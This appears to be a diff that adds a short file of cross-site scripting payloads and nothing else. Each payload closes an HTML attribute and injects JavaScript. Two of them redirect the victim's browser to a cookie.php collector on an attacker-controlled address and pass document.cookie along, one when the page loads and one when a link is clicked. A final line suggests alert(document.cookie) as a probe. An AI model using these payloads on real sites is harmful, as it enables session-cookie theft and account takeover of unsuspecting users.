@@ -1,0 +1,7 @@
+http://54.67.42.179/"><script language= "JavaScript">document.location="http://127.0.0.1:1370/cookie.php?cookie=" + document.cookie;document.location="http://54.67.42.179/"</script>
+
+
+http://54.67.42.179/"><a href="#" onclick="document.location='http://192.168.43.156/cookie.php?cookie=' +escape(document.cookie);"><Click Me></a></script>
+ 
+ alert(document.cookie) use this
+
